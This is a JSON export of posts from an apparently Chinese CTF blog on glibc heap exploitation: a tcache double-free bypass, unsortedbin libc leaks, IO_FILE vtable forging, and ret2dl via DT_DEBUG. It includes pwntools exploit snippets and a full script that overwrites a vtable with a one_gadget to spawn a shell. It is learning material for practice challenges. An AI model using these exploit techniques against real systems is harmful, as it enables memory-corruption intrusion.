参考LD_PRELOAD的偷梁换柱之能","categories":[],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"Tcahce学习","slug":"Tcache学习","date":"2021-08-17T02:53:00.000Z","updated":"2021-10-29T06:00:49.343Z","comments":true,"path":"2021/08/17/Tcache学习/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Tcahce学习0）review说是Tcache学习，实际上是lonelywolf的复现。 网上wp都是神仙写的，一点也不萌新友好。我都看不懂（） 打开题发现这个菜单题好常规。 但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。 具体的参考可以看glibc2.31下的新double free手法/字节跳动pwn题gun题解。但是在这道题里面充其量算一个trick而不是核心考点。 1）漏洞点unsigned __int64 delete() { __int64 v1; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, \"Index: \"); __isoc99_scanf(&amp;number, &amp;v1); if ( !v1 &amp;&amp; buf ) free(buf); return __readfsqword(0x28u) ^ v2; } 漏洞点。经典uaf。 之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。 while ( 1 ) { read(0, v0, 1uLL); if ( *v0 == '\\n' ) break; if ( ++v0 == v1 ) return __readfsqword(0x28u) ^ v4; } *v0 = 0; 然后有一个比较怪的点就是这里的 __readfsqword();。很明显他是一个和读取有关的函数，但是ida根本点不进去。 后面我才知道这个函数是和canary保护有关。 根据微软官方文档…这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。 但是好像说了和没说一样。 回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。Canary安全机制原理实战分析 ![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png) 2）漏洞利用1）Tcache double free之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。 虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。 add(0,0x68) free(0) gdb.attach(p) pause() 首先先分配再释放一下，看看这个题具体的内存分布有什么特点。 pwndbg&gt; hea Allocated chunk | PREV_INUSE Addr: 0x55e9c994c000 Size: 0x251 Free chunk (tcache) | PREV_INUSE Addr: 0x55e9c994c250 Size: 0x71 fd: 0x00 Top chunk | PREV_INUSE Addr: 0x55e9c994c2c0 Size: 0x20d41 pwndbg&gt; bin tcachebins 0x70 [ 1]: 0x55e9c994c260 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty 之前一直不是很清楚 Allocated chunk | PREV_INUSE Addr: 0x55e9c994c000 Size: 0x251 这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。 然后这边 0x70 [ 1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk， pwndbg&gt; x/300gx 0x562fcfd39000 0x562fcfd39000: 0x0000000000000000 0x0000000000000251 0x562fcfd39010: 0x0000010000000000 0x0000000000000000 0x562fcfd39020: 0x0000000000000000 0x0000000000000000 0x562fcfd39030: 0x0000000000000000 0x0000000000000000 0x562fcfd39040: 0x0000000000000000 0x0000000000000000 0x562fcfd39050: 0x0000000000000000 0x0000000000000000 0x562fcfd39060: 0x0000000000000000 0x0000000000000000 0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260 这是控制堆块的部分结构 0x562fcfd39010: 0x0000010000000000 0x0000000000000000中，1说明只有一个Tcache。 T擦车堆块的首地址也记录在内。从0x562fcfd39050开始分别记录0x20到0x70的Tcache chunk的首地址，比如0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260,记录的就是0x70大小chunk的首地址。 喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。 pwndbg&gt; x/20gx 0x56533012f250 0x56533012f250: 0x0000000000000000 0x0000000000000071 0x56533012f260: 0x0000000000000000 0x000056533012f010 我们到Tcache的地址中看一看，会发现0x56533012f260: 0x0000000000000000 0x000056533012f010处的0x000056533012f010，这是一个key值。 2.29下Tcahce double free的检测之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是 对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry) typedef struct tcache_entry { struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段 } tcache_entry; 也就是所谓的key对应的就是chunk的bk字段。 当chunk被free，放入Tcache链表时，操作如下。 static __always_inline void tcache_put(mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加 } 然后进行free操作 size_t tc_idx = csize2tidx(size); //只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) { /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(\"free(): double free detected in tcache 2\"); } if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 { tcache_put(p, tc_idx); return; } } 源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。 大致是 add(0,0x78) free(0) edit(0,b\"aaaa\") free(0) show(0) 再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。 然后我们需要构造出unsortedbin chunk、 但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。 那么有什么办法能构造出unsortedbin呢？回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？ 如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？ 然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。 总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。 然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。 调试接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。 但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。 Tcache 利用不是学习不是学习不是学习， 例题是lctf2018的easyheap。 漏洞点一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。 然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。 unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2) { signed int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( a2 ) { while ( 1 ) { read(0, &amp;a1[v3], 1uLL); if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 ) break; ++v3; } a1[v3] = 0; a1[a2] = 0;//loophole } else { *a1 = 0; } return __readfsqword(0x28u) ^ v4; } 然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。 在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。 包括ciscn lonelywolf也是利用到了这一点。 参考2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分 glibc2.31下的新double free手法/字节跳动pwn题gun题解 CISCN2021 lonelywolf","categories":[],"tags":[{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"}]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","slug":"ELF文件下对于PIE保护和ASLR的重新认识","date":"2021-08-13T07:06:00.000Z","updated":"2021-12-08T03:10:55.607Z","comments":true,"path":"2021/08/13/ELF文件下对于PIE保护和ASLR的重新认识/","link":"","permalink":"https://fuurinko.github.io/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","excerpt":"","text":"ELF文件下对于PIE保护和ASLR的重新认识0）​ 复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。 1）​ 如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。 ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。 也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。 在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。 这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。 PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。 ​ 然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"IO_FILE学习","slug":"io_file（未完成）","date":"2021-08-09T07:44:00.000Z","updated":"2021-11-18T02:24:47.196Z","comments":true,"path":"2021/08/09/io_file（未完成）/","link":"","permalink":"https://fuurinko.github.io/2021/08/09/io_file%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89/","excerpt":"","text":"io_file学习笔记 0）reviewglibc定义了_IO_FILE这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的_IO_FILE_plus结构 结构源码如下 struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } 这个结构包含了一个叫vtable的指针，指向实现io函数各种功能的真正函数。 以fread为例子简述io_file结构调用的流程 freadfread真正功能的实现在子函数_IO_sgetn中。 下面是_IO_sgetn的源码。 _IO_size_t _IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } 实际上也是先定义一堆变量然后内部再调用另外一个函数。 也就是_IO_XSGETN。 这个函数并不简单，它是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。 vtable也是一个指针，指向结构体_IO_jump_t _IO_jump_t源码如下 struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; 这里vtable就像一个中转站，通过它调用_IO_jump_t中的各种函数。 比如说这里fread就是调用的_IO_file_xsgetn函数。 值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。 if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } 函数源码如上，实现的是一个键盘输入。 实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。 伪造vtable在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。 那么应该如何伪造vtable呢？目前有两种思路。 一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。 在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。 但是我们先从第一个方法来试一试。 示例来源于ctf-wiki int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } 这边利用的具体步骤比较直观。 遍历 _IO_list_all ，然后调用 _IO_2_1_stdout_ 下的 vtable 中 _setbuf 函数。 承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。 在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。 开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。 pwndbg&gt; print _IO_2_1_stdin_ $2 = { file = { _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' &lt;repeats 19 times&gt; }, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt; } 我们可以看到vtable的地址是0x7ffff7dca2a0。 然后我们需要在它附近伪造一个vtable。 伪造的vtable需要符合以下条件：1:fake_vtable + 0x58=libc_base+off_3 完整exp from pwn import * context.log_level=\"debug\" libc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p = process('the_end') libc_base = long(sleep_ad,16) - libc.symbols['sleep'] one_gadget = libc_base + 0xf02b0 vtables = libc_base + 0x3C56F8 fake_vtable = libc_base + 0x3c5588 target_addr = libc_base + 0x3c55e0 for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i]) for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i]) p.sendline(\"exec /bin/sh 1&gt;&amp;0\") p.interactive() 总结伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了。 下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。 FSOP上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。 这一个part我们学习FSOP。 ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧/// FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项","categories":[],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]},{"title":"pwn题中的一些奇怪的姿势","slug":"pwn题中的一些奇怪的姿势","date":"2021-08-03T06:56:14.000Z","updated":"2021-11-18T02:23:50.374Z","comments":true,"path":"2021/08/03/pwn题中的一些奇怪的姿势/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"patch alarm比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。 一般来说许多题都喜欢在main函数里加alarm。 alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。 ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。 解决方案也比较弱智。就是直接patch掉就好了。 ida都关了懒得上图了。 单双引号问题​ 萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。 ​ 然后索性调试一下，发现了奇点。 ​ ​ 这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是/bin/sh，但是实际是n/sh，只有后面四个字节了。 ​ 我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样： ​ 但是我的程序是这样： ​ 然后发动传统艺能，控制变量找不同，发现问题出在system('/bin/sh')上。 ​ 因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些('./') (\"./\")，看起来区别不大，实际上也没有什么影响。 ​ 但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 ​ 然后把单引号改成双引号之后，就getshell了。 roputils做ret2dl的时候难免会偷懒使用工具。 但是这个工具并没有看起来那么和善。 就怎么使用utils包我都研究了一会儿，然后发现只需要import roputils然后把相对应的那个py脚本放到同一路径下就好。 但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。 所以解决方式有2 将roputils转换为py3 ubuntu切换py版本 反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接2to3 -w roputils.py 具体参数可以google。 然后又来了第三个问题。 来看我的报错。 [+] Starting local process './babystack': pid 745 Traceback (most recent call last): File \"babystack.py\", line 23, in &lt;module&gt; rop = roputils.ROP('./babystack') File \"/home/fur1n/pwn/week1/roputils.py\", line 440, in __init__ ELF.__init__(self, *args, **kwargs) File \"/home/fur1n/pwn/week1/roputils.py\", line 85, in __init__ m = re.search(r'^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$', line) File \"/usr/lib/python3.6/re.py\", line 182, in search return _compile(pattern, flags).search(string) TypeError: cannot use a string pattern on a bytes-like object 这个功能好像并不会在byte前加b。。。 目前来说并没有发现解决方法。 所以只能尝试更换默认的py版本。具体可以google main_arena与多线程在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ret2dl_advanced","slug":"ret2dl_advanced","date":"2021-08-02T03:22:53.000Z","updated":"2021-08-02T08:11:22.155Z","comments":true,"path":"2021/08/02/ret2dl_advanced/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/ret2dl_advanced/","excerpt":"","text":"ret2dl_advanced1)review当FULL RELRO保护开启时，通过 dl_run_time来获取libc基址的方式几乎无解。 但是我们仍然能够找到某种方式来getshell。 相关论文中给出一种解决方案，即通过dt_bug入口找到突破点。 (Ps:为什么找不到相关的中文文章) 2）dt_dbg？dt_dbg这个概念实际上并不新鲜，简单来说它可以被包含在libc.so文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个libc.so文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。 dt_dubug用于指向type_r_debug这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。 此外，这个结构体的r_map域保存了指向link_map的链接表表头的指针。 也就是dt_dbg指向type_r_debug，且type_r_debug维护了指向link_map的指针。 r_debug具体代码如下: /* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable's dynamic section has a DT_DEBUG element, the run-time linker sets that element's value to the address where this structure can be found. */ struct r_debug { int r_version; /* Version number for this protocol. */ struct link_map *r_map; /* Head of the chain of loaded objects. */ /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */ ElfW(Addr) r_brk; enum { /* This state value describes the mapping change taking place when the `r_brk' address is called. */ RT_CONSISTENT, /* Mapping change is complete. */ RT_ADD, /* Beginning to add a new object. */ RT_DELETE /* Beginning to remove an object mapping. */ } r_state; ElfW(Addr) r_ldbase; /* Base address the linker is loaded at. */ }; 实操一遍 随便写一个无output的栈溢出。 fur1n@ubuntu:~/pwn$ readelf -d ret2dl Dynamic section at offset 0xdb8 contains 27 entries: Tag Type Name/Value ... 0x0000000000000015 (DEBUG) 0x0 在没有运行的时候dt_dbg为空。 在关闭aslr的情况下找到dt_debug并不困难。 gdb使用elfheader命令查看相关elfheader的地址，可以找到.dynamic 段的地址。 pwndbg&gt; x/50gx 0x600e20 ... 0x600ee0: 0x0000000000000015 0x00007ffff7ffe140 0x00007ffff7ffe140也就是dt_debug指向的r_debug的地址。 pwndbg&gt; x/20gx 0x00007ffff7ffe140 0x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 0x7ffff7ffe150 &lt;_r_debug+16&gt;: 0x00007ffff7de3f40 0x0000000000000000 0x7ffff7ffe160 &lt;_r_debug+32&gt;: 0x00007ffff7dd3000 0x0000000000000000 0x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe700 0x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710 0x7ffff7ffe190: 0x0000000000000000 0x00007ffff7ffe170 0x7ffff7ffe1a0: 0x0000000000000000 0x00007ffff7ffe6e8 0x7ffff7ffe1b0: 0x0000000000000000 0x0000000000600e20 0x7ffff7ffe1c0: 0x0000000000600f00 0x0000000000600ef0 0x7ffff7ffe1d0: 0x0000000000000000 0x0000000000600ea0 r_debug维护的第一个结构体，也就是link_map地址，即0x00007ffff7ffe170 0x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 这样我们就从dt_debug找到了link_map的地址。 虽然但是。 只是找到link_map没啥用。 我们的最终目的还是寻找到dl_runtime_resolve函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。 能从动态链接库中找到dl_runtime_resolve函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到dl_runtime_resolve函数地址，那么问题就迎刃而解了。 那么如何寻找呢？ 实际比较简单（无aslr的情况），只要根据link_map的结构依次顺下来就好了。 上一个section我们找到了link_map的地址，接下来我们通过link_map逐步找到 dl_runtime_resolve。 首先我们找到libc.so.6文件。 pwndbg&gt; x/20gx 0x00007ffff7ffe170 0x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe700 0x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710 --- pwndbg&gt; x/20gx 0x00007ffff7ffe700 0x7ffff7ffe700: 0x0000000000000000 0x0000000000000000 0x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0 --- pwndbg&gt; x/s 0x00007ffff7ffebb0 0x7ffff7ffebb0: \"linux-vdso.so.1\" --- pwndbg&gt; x/10gx 0x00007ffff7ffe710 0x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0 0x7ffff7ffe720: 0x00007ffff7ffb3a0 0x00007ffff7fe2000 --- pwndbg&gt; x/10gx 0x00007ffff7fe2000 0x7ffff7fe2000: 0x00007ffff79e2000 0x00007ffff7ffedd0 --- pwndbg&gt; x/s 0x00007ffff7ffedd0 0x7ffff7ffedd0: \"/lib/x86_64-linux-gnu/libc.so.6\" 即0x00007ffff7ffedd0。 0x3即GOT[]入口 pwndbg&gt; x/30gx 0x00007ffff7dccb80 ... 0x7ffff7dccc30: 0x0000000000000003 0x00007ffff7dcd000 找到GOT[3] pwndbg&gt; x/5gx 0x00007ffff7dcd000 0x7ffff7dcd000: 0x00000000003eab80 0x00007ffff7fe2000 0x7ffff7dcd010: 0x00007ffff7dea8f0 0x00007ffff7b70a10 pwndbg&gt; xinfo 0x00007ffff7dea8f0 Extended information for virtual address 0x7ffff7dea8f0: Containing mapping: 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so Offset information: Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0 Containing ELF sections: .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0 3）exploitation在无aslr并已经获取到dl_runtime_resolve的情况下的利用和patial relro相似。 